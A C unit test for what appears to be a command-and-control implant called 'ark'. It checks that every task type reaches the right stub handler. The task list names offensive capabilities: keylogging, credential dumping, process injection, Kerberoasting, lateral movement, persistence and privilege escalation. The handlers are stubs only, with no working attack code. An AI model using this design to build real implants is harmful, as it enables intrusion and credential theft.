/* Host test: every proto TaskType has a C executor disposition.
 *
 * Links executor.c against stub handlers so this proves routing, not Windows
 * module implementations. A missing table row for a new enum fails the test.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "ark/modules.h"
#include "ark/pb_c2.h"
#include "ark/task_handlers.h"
#include "ark/tasks.h"

static int fails;
static char g_last[64];

static void expect(const char *name, int cond) {
    if (!cond) {
        fprintf(stderr, "FAIL: %s\n", name);
        fails++;
    }
}

static int stub_named(const char *name, uint8_t **out, size_t *out_len) {
    snprintf(g_last, sizeof(g_last), "%s", name);
    size_t n = strlen(name);
    *out = (uint8_t *)malloc(n + 1);
    if (!*out) {
        *out_len = 0;
        return 0;
    }
    memcpy(*out, name, n + 1);
    *out_len = n;
    return 1;
}

#define STUB_DATA(fn, name) \
    int fn(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) { \
        (void)data; (void)data_len; \
        return stub_named(name, out, out_len); \
    }

#define STUB_NOARG(fn, name) \
    int fn(uint8_t **out, size_t *out_len) { \
        return stub_named(name, out, out_len); \
    }

STUB_DATA(ark_task_shell_execute, "shell")
STUB_DATA(ark_task_file_download, "file_download")
STUB_DATA(ark_task_file_upload, "file_upload")
STUB_NOARG(ark_task_process_list, "process_list")
STUB_DATA(ark_task_process_kill, "process_kill")
STUB_NOARG(ark_task_net_ifconfig, "net_ifconfig")
STUB_DATA(ark_task_net_portscan, "net_portscan")
STUB_DATA(ark_task_screenshot, "screenshot")
STUB_DATA(ark_task_keylog_start, "keylog_start")
STUB_DATA(ark_task_keylog_stop, "keylog_stop")
STUB_DATA(ark_task_keylog_dump, "keylog_dump")
STUB_DATA(ark_task_inject, "inject")
STUB_DATA(ark_task_peload, "peload")
STUB_DATA(ark_task_socks_start, "socks_start")
STUB_DATA(ark_task_socks_stop, "socks_stop")
STUB_DATA(ark_task_module, "module")
STUB_DATA(ark_mod_creds_dump, "creds_dump")
STUB_DATA(ark_mod_ldap_enum, "ldap_enum")
STUB_DATA(ark_mod_kerberoast, "kerberoast")
STUB_DATA(ark_mod_asreproast, "asreproast")
STUB_DATA(ark_mod_lateral_move, "lateral_move")
STUB_DATA(ark_mod_persist, "persist")
STUB_DATA(ark_mod_privesc, "privesc")

enum {
    DISP_HANDLER = 1,
    DISP_CONTROL = 2,
    DISP_CAPABILITY = 3
};

struct case_row {
    int         type;
    const char *name;
    int         disp;
    const char *handler;
    const char *err_sub;
};

static const struct case_row k_cases[] = {
    { ARK_TASK_UNKNOWN,       "UNKNOWN",       DISP_CAPABILITY, NULL,            "unsupported task type" },
    { ARK_TASK_SHELL,         "SHELL",         DISP_HANDLER,    "shell",         NULL },
    { ARK_TASK_FILE_DOWNLOAD, "FILE_DOWNLOAD", DISP_HANDLER,    "file_download", NULL },
    { ARK_TASK_FILE_UPLOAD,   "FILE_UPLOAD",   DISP_HANDLER,    "file_upload",   NULL },
    { ARK_TASK_PROCESS_LIST,  "PROCESS_LIST",  DISP_HANDLER,    "process_list",  NULL },
    { ARK_TASK_PROCESS_KILL,  "PROCESS_KILL",  DISP_HANDLER,    "process_kill",  NULL },
    { ARK_TASK_NET_IFCONFIG,  "NET_IFCONFIG",  DISP_HANDLER,    "net_ifconfig",  NULL },
    { ARK_TASK_NET_PORTSCAN,  "NET_PORTSCAN",  DISP_HANDLER,    "net_portscan",  NULL },
    { ARK_TASK_CREDS_DUMP,    "CREDS_DUMP",    DISP_HANDLER,    "creds_dump",    NULL },
    { ARK_TASK_SCREENSHOT,    "SCREENSHOT",    DISP_HANDLER,    "screenshot",    NULL },
    { ARK_TASK_KEYLOG_START,  "KEYLOG_START",  DISP_HANDLER,    "keylog_start",  NULL },
    { ARK_TASK_KEYLOG_STOP,   "KEYLOG_STOP",   DISP_HANDLER,    "keylog_stop",   NULL },
    { ARK_TASK_KEYLOG_DUMP,   "KEYLOG_DUMP",   DISP_HANDLER,    "keylog_dump",   NULL },
    { ARK_TASK_PIVOT_START,   "PIVOT_START",   DISP_CAPABILITY, NULL,            "pivot" },
    { ARK_TASK_PIVOT_STOP,    "PIVOT_STOP",    DISP_CAPABILITY, NULL,            "pivot" },
    { ARK_TASK_INJECT,        "INJECT",        DISP_HANDLER,    "inject",        NULL },
    { ARK_TASK_PE_LOAD,       "PE_LOAD",       DISP_HANDLER,    "peload",        NULL },
    { ARK_TASK_SOCKS_START,   "SOCKS_START",   DISP_HANDLER,    "socks_start",   NULL },
    { ARK_TASK_SOCKS_STOP,    "SOCKS_STOP",    DISP_HANDLER,    "socks_stop",    NULL },
    { ARK_TASK_EXIT,          "EXIT",          DISP_CONTROL,    NULL,            NULL },
    { ARK_TASK_SLEEP,         "SLEEP",         DISP_CONTROL,    NULL,            NULL },
    { ARK_TASK_MODULE,        "MODULE",        DISP_HANDLER,    "module",        NULL },
    { ARK_TASK_LDAP_ENUM,     "LDAP_ENUM",     DISP_HANDLER,    "ldap_enum",     NULL },
    { ARK_TASK_KERBEROAST,    "KERBEROAST",    DISP_HANDLER,    "kerberoast",    NULL },
    { ARK_TASK_ASREPROAST,    "ASREPROAST",    DISP_HANDLER,    "asreproast",    NULL },
    { ARK_TASK_LATERAL_MOVE,  "LATERAL_MOVE",  DISP_HANDLER,    "lateral_move",  NULL },
    { ARK_TASK_PE_LOAD_EXEC,  "PE_LOAD_EXEC",  DISP_HANDLER,    "peload",        NULL },
    { ARK_TASK_PERSIST,       "PERSIST",       DISP_HANDLER,    "persist",       NULL },
    { ARK_TASK_PRIVESC,       "PRIVESC",       DISP_HANDLER,    "privesc",       NULL },
};

static const struct case_row *find_case(int type) {
    for (size_t i = 0; i < sizeof(k_cases) / sizeof(k_cases[0]); i++) {
        if (k_cases[i].type == type)
            return &k_cases[i];
    }
    return NULL;
}

static void run_case(const struct case_row *c) {
    char label[128];
    snprintf(label, sizeof(label), "%s(%d)", c->name, c->type);

    ark_task task;
    memset(&task, 0, sizeof(task));
    strncpy(task.task_id, "t1", sizeof(task.task_id) - 1);
    task.task_type = c->type;

    g_last[0] = '\0';
    ark_task_result r = ark_execute_task(&task);

    if (strcmp(r.task_id, "t1") != 0) {
        fprintf(stderr, "FAIL: %s task_id %s\n", label, r.task_id);
        fails++;
    }

    switch (c->disp) {
    case DISP_HANDLER:
        if (!r.success) {
            fprintf(stderr, "FAIL: %s expected success, error=%s\n", label, r.error);
            fails++;
        }
        if (strcmp(g_last, c->handler) != 0) {
            fprintf(stderr, "FAIL: %s handler got %s want %s\n", label, g_last, c->handler);
            fails++;
        }
        break;
    case DISP_CONTROL:
        if (!r.success) {
            fprintf(stderr, "FAIL: %s control expected success, error=%s\n", label, r.error);
            fails++;
        }
        if (g_last[0]) {
            fprintf(stderr, "FAIL: %s control invoked handler %s\n", label, g_last);
            fails++;
        }
        break;
    case DISP_CAPABILITY:
        if (r.success) {
            fprintf(stderr, "FAIL: %s expected capability error\n", label);
            fails++;
        }
        if (!c->err_sub || !strstr(r.error, c->err_sub)) {
            fprintf(stderr, "FAIL: %s error \"%s\" missing %s\n", label, r.error, c->err_sub ? c->err_sub : "");
            fails++;
        }
        if (g_last[0]) {
            fprintf(stderr, "FAIL: %s capability invoked handler %s\n", label, g_last);
            fails++;
        }
        break;
    default:
        fprintf(stderr, "FAIL: %s unknown disposition\n", label);
        fails++;
        break;
    }

    free(r.data);
}

int main(void) {
    ark_task_result null_r = ark_execute_task(NULL);
    expect("null task fails", !null_r.success && strstr(null_r.error, "null task") != NULL);
    free(null_r.data);

    expect("table size is contiguous min..max",
        (int)(sizeof(k_cases) / sizeof(k_cases[0])) == ARK_TASK_TYPE_MAX - ARK_TASK_TYPE_MIN + 1);

    for (int t = ARK_TASK_TYPE_MIN; t <= ARK_TASK_TYPE_MAX; t++) {
        const struct case_row *c = find_case(t);
        char gap[64];
        snprintf(gap, sizeof(gap), "missing disposition for task type %d", t);
        expect(gap, c != NULL);
        if (c)
            run_case(c);
    }

    struct case_row future = { 99, "FUTURE", DISP_CAPABILITY, NULL, "unsupported task type" };
    run_case(&future);
    struct case_row neg = { -1, "NEGATIVE", DISP_CAPABILITY, NULL, "unsupported task type" };
    run_case(&neg);

    if (fails) {
        fprintf(stderr, "%d task-dispatch host tests failed\n", fails);
        return 1;
    }
    return 0;
}
